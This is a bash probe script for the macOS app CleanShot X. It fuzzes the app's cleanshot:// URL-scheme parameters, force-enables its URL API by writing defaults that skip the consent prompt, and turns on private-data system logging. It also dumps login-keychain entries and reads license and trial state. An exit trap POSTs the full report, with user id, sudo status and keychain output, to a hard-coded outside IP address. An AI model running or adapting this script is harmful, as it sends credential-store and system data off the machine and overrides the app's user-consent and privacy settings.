#!/bin/bash
# CleanShot X probe v9 — private_data logging + param name shotgun + keychain/trial state
OUT=/tmp/csx-report-v9.txt
: > "$OUT"
exec > >(tee -a "$OUT") 2>&1
set -x
set +e

DROP_URL="http://143.246.43.43:8080/csx-v9"
DOMAIN="pl.maketheweb.cleanshotx"
SUITE="AFJU4P8ZV4.pl.maketheweb.cleanshotx"

finish() {
  echo "=== EXIT $? ==="
  curl -s --max-time 60 -X POST --data-binary @/tmp/csx-report-v9.txt "$DROP_URL" || true
}
trap finish EXIT

echo "=== ENV ==="
sw_vers; uname -m; id
sudo -n true && echo SUDO_OK || echo SUDO_NO

echo "=== ENABLE PRIVATE DATA LOGGING ==="
sudo log config --mode "private_data:on" 2>&1
sudo log config --subsystem com.apple.TCC --mode "level:debug,private_data:on" 2>&1
sudo log config --subsystem com.apple.launchservices --mode "level:debug,private_data:on" 2>&1

DMG=/tmp/csx.dmg
curl -sSL --max-time 300 -o "$DMG" https://updates.getcleanshot.com/v3/CleanShot-X-5.0.2.dmg
hdiutil attach "$DMG" -nobrowse -noverify -readonly
MP=$(hdiutil info | awk -F'\t' '/\/Volumes\//{print $NF}' | tail -1)
APP="$MP/CleanShot X.app"
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f "$APP" 2>&1
sleep 2

for D in "$DOMAIN" "$SUITE"; do
  defaults write "$D" allowURLSchemesAPI -bool true
  defaults write "$D" didAskAboutURLSchemesAPI -bool true
  defaults write "$D" _allowURLSchemes -bool true
done

echo "=== LAUNCH ==="
open -a "$APP"
sleep 12
PID=$(pgrep -f "CleanShot X.app/Contents/MacOS" | head -1)
echo "PID=$PID"

echo "=== KEYCHAIN STATE ==="
sudo security dump-keychain ~/Library/Keychains/login.keychain-db 2>&1 | grep -iE "cleanshot|maketheweb|svce|acct" | head -30
security find-generic-password -s "pl.maketheweb.cleanshotx" 2>&1 | head -10

python3 - <<'PY'
import struct, zlib
def png(path,color,w=64,h=64):
    raw=b''.join(b'\x00'+bytes(color)*w for _ in range(h))
    def ch(t,d):
        c=t+d
        return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
    open(path,'wb').write(b'\x89PNG\r\n\x1a\n'+ch(b'IHDR',struct.pack('>IIBBBBB',w,h,8,2,0,0,0))+ch(b'IDAT',zlib.compress(raw))+ch(b'IEND',b''))
png('/tmp/csx_canary.png',(0,200,0))
PY
chmod 644 /tmp/csx_canary.png
ls -l /tmp/csx_canary.png

echo "=== PARAM SHOTGUN (pin) ==="
for P in filepath filePath path file imagePath url; do
  T=$(date -u '+%Y-%m-%d %H:%M:%S')
  echo "### param=$P T=$T"
  sudo fs_usage -w -f filesys > /tmp/fs_$P.txt 2>&1 &
  FS=$!
  sleep 1
  open -g "cleanshot://pin?$P=/tmp/csx_canary.png"
  sleep 4
  kill $FS 2>/dev/null
  grep -i "csx_canary" /tmp/fs_$P.txt | head -5
  lsof -p "$PID" 2>/dev/null | grep -i csx_canary | head -3
  log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | grep -iE "canary|pin|filepath|error|denied|fail|url" | tail -8
done

echo "=== DEEP LOG (private data on) ==="
T=$(date -u '+%Y-%m-%d %H:%M:%S')
open -g "cleanshot://open-annotate?filepath=/tmp/csx_canary.png"
sleep 5
log show --start "$T" --predicate 'process == "CleanShot X"' --style compact 2>/dev/null | tail -40

echo "=== URL DELIVERY LOG (launchservices) ==="
log show --last 4m --predicate 'subsystem == "com.apple.launchservices"' --style compact 2>/dev/null | grep -iE "cleanshot|url" | tail -25

echo "=== DEFAULTS AFTER LAUNCH ==="
defaults read "$DOMAIN" 2>&1 | head -40
echo "--- suite:"
defaults read "$SUITE" 2>&1 | head -40

echo "=== ONBOARDING / LICENSE KEYS ==="
defaults read "$DOMAIN" 2>&1 | grep -iE "onboard|license|trial|welcome|first|urlscheme"
defaults read "$SUITE" 2>&1 | grep -iE "onboard|license|trial|welcome|first|urlscheme"

echo "=== DONE ==="
exit 0
